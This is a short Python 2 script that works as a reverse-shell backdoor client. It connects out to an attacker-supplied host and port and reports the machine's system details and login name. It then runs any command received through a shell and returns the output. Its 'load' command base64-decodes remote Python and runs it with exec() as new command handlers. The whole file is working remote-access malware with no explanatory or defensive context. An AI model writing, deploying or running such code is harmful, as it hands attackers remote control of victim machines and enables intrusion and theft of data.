#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys, socket, subprocess as sp, base64

if len(sys.argv) != 3:
    print "provide host and port"
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

sysinfo = ""
if os.name == "nt":
    pass
else:
    sysinfo =  ",".join(os.uname()) + "," + os.getlogin()

def send_data(conn, data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)

def recv_data(conn):
    data = conn.recv(1024)
    data_len = long(data[:16])
    data = data[16:]
    while data_len > len(data):
        data += conn.recv(1024)

    return data

def exec_os_cmd(cmd):
    sh = sp.Popen(cmd, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE, shell=True)
    out, err = sh.communicate();
    return out + err

def exit(cmd):
    s.close()
    sys.exit(0)

def load(cmd):
    return "Command %s loaded ok..." % cmd.split(" ")[1]

commands = {
    "exit" : exit,
    "exec" : exec_os_cmd,
    "load" : load
}

send_data(s, sysinfo)

while 1:
    data = recv_data(s)
    command = data.split(" ")[0].lower()
    result = ""
    if command == "load":
        parts = data.split(" ")
        command_name = parts[1]
        content = base64.b64decode(parts[2])
        exec(content)
        main = sys.modules[__name__]
        func = getattr(main, "client_" + command_name)
        commands[command_name] = func
    elif not command in commands.keys():
        command = "exec"
    
    result = commands[command](data)
    send_data(s, result)
    
        
    

